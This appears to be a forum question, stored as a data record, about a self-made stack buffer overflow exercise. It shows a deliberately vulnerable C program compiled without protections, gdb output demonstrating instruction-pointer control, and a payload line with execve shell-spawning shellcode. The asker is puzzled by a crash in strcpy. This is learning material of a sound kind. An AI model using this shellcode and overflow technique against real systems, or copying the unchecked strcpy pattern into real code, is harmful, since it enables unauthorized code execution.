  "content": "I am trying to do a simple buffer overflow exploitation by overwriting the instruction pointer %rip.\n\nHere's my code of vuln.c\n\n```\n#include <stdio.h>\n#include <string.h>\n#include <stdlib.h>\n\nint main(int argc, char* argv[])\n{\n\n    char buffer[256];\n    strcpy(buffer, argv[1]);\n    printf(\"%s  \n\", buffer);\n    return 0;\n}\n\n```\nwhich I compile with \n\n```\ngcc vuln.c -o vuln -z execstack -fno-stack-protector\n\n```\nAs discussed in the question here I am confident that I am able to control the instruction pointer by feeding something along the lines of \n\n```\ngdb$ r $(python -c 'print \"A\"*264 + \"\\x7f\\xff\\xff\\xff\\xd8\\xc0\"[::-1]')\n\n```\nto gdb, as this gives me:\n\n```\nStopped reason: SIGSEGV\n0x00007fffffffd8c0 in ?? ()\ngdb$ x 0x00007fffffffd8c0\n0x7fffffffd8c0: 0x4141414141414141\ngdb$ \n\n```\nSo apparently I managed to redirect execution flow to a place in memory that I wanted.\n\nNow I want to execute some shellcode at this position. For that I use a execve shellcode that I compiled on the same system I am trying to exploit:\n\n```\n$ objdump -d spawnshell.o\n\nspawnshell.o:     file format elf64-x86-64\n\nDisassembly of section .text:\n\n0000000000000000 <_start>:\n   0:   48 bb 2f 2f 62 69 6e    movabs $0x68732f6e69622f2f,%rbx\n   7:   2f 73 68 \n   a:   48 c1 eb 08             shr    $0x8,%rbx\n   e:   53                      push   %rbx\n   f:   48 89 e7                mov    %rsp,%rdi\n  12:   50                      push   %rax\n  13:   57                      push   %rdi\n  14:   48 89 e6                mov    %rsp,%rsi\n  17:   b0 3b                   mov    $0x3b,%al\n  19:   0f 05                   syscall \n\n```\nSpawnshell.o is tested on my system and works.\n\nWritten in more compact form:\n\nNow I would expect that I should be able to inject this at the beginning of my buffer, pad the remaining buffer with \"A\"'s and then again overwrite the instruction pointer in the end:\n\n```\ngdb$ r $(python -c 'print \"\\x48\\xbb\\x2f\\x2f\\x62\\x69\\x6e\\x2f\\x73\\x68\\x48\\xc1\\xeb\\x08\\x53\\x48\\x89\\xe7\\x50\\x57\\x48\\x89\\xe6\\xb0\\x3b\\x0f\\x05\" + A\"*(264-27) + \"\\x7f\\xff\\xff\\xff\\xd8\\xc0\"[::-1]')\n\n```\nIf I do this something else that I don't understand happens: I end up somewhere in the __strcpy_sse2_unaligned function at the following command:\n\n```\n<__strcpy_sse2_unaligned+551> movdqu xmm1,XMMWORD PTR [rsi]\n\n```\nand a segfault:\n\n```\nStopped reason: SIGSEGV\n__strcpy_sse2_unaligned () at ../sysdeps/x86_64/multiarch/strcpy-sse2-unaligned.S:296\n296 ../sysdeps/x86_64/multiarch/strcpy-sse2-unaligned.S: No such file or directory.\n\n```\nSo my interpretation is, that the strcpy function is choking on something, even before I get to overwrite the %rip.\n\nWhat is it, or how do I go about finding out what the problem is?\n\n",
